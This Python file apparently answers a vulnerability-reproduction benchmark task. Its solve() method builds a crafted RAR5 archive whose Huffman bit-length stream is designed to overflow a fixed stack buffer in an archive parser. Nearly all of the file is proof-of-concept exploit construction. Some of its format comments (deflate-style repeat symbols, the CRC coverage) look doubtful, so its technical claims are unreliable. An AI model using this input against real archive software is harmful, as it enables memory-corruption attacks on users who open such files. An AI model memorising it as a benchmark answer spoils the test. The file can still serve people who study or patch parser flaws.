import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 Signature: 8 bytes
        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

        def varint(n):
            out = b''
            while True:
                byte = n & 0x7F
                n >>= 7
                if n:
                    byte |= 0x80
                    out += bytes([byte])
                else:
                    out += bytes([byte])
                    break
            return out

        # 1. Main Archive Header
        # Body: Type(1) + Flags(0)
        main_body = b'\x01\x00'
        # Header Size = len(main_body)
        main_crc = struct.pack('<I', zlib.crc32(main_body) & 0xFFFFFFFF)
        main_block = main_crc + varint(len(main_body)) + main_body

        # 2. Payload Construction
        # We need to trigger a stack buffer overflow in the Huffman table parsing logic.
        # The reader allocates a fixed-size buffer (typically 306 bytes for the Main Table) on the stack.
        # We construct a bit stream that expands to more than 306 entries using RLE.
        
        # Total payload size (matches Data Size in header)
        payload_len = 480 

        # Bit Code (BC) Table: 20 entries, 4 bits each -> 10 bytes.
        # We set indices 18 and 19 to length 1.
        # This creates a Huffman tree where:
        #   Code '0' -> Symbol 18
        #   Code '1' -> Symbol 19
        # (or vice versa, both destructive here).
        # Symbol 18: Repeat zeros (runs of 11-138).
        # Symbol 19: Repeat last length (runs of 3-6).
        # We place nibbles 1 (0x1) for indices 18 and 19 in the last byte.
        bc_table = b'\x00' * 9 + b'\x11'
        
        # Data Stream:
        # We fill the rest with 0x00.
        # Each 0x00 byte represents 8 '0' bits.
        # Each '0' bit decodes to Symbol 18 (assuming '0' code).
        # Symbol 18 reads 7 bits for length. Since stream is all 0s, it reads 0.
        # Action: Repeat zeros 11 + 0 = 11 times.
        # One bit -> 11 entries. One byte -> 88 entries.
        # 470 bytes -> ~41,000 entries.
        # This massively overflows the 306-entry stack buffer.
        data_stream = b'\x00' * (payload_len - len(bc_table))
        payload = bc_table + data_stream

        # 3. File Header
        # Construct the body of the File Header
        file_body_parts = [
            varint(2),              # Type: File Header
            varint(1),              # Header Flags: 0x01 (Has Data)
            varint(payload_len),    # Data Size
            varint(0),              # File Flags: 0
            varint(1000),           # Unpacked Size: arbitrary non-zero
            varint(0),              # Attributes
            varint(1),              # Compression Info: Method 1 (Fastest) -> Triggers Huffman
            varint(0),              # Host OS: Windows/Generic
            varint(1),              # Name Length
            b'a'                    # Name
        ]
        file_body = b''.join(file_body_parts)
        
        # Calculate CRC and assemble block
        file_crc = struct.pack('<I', zlib.crc32(file_body) & 0xFFFFFFFF)
        file_header_size = varint(len(file_body))
        file_block = file_crc + file_header_size + file_body

        return sig + main_block + file_block + payload
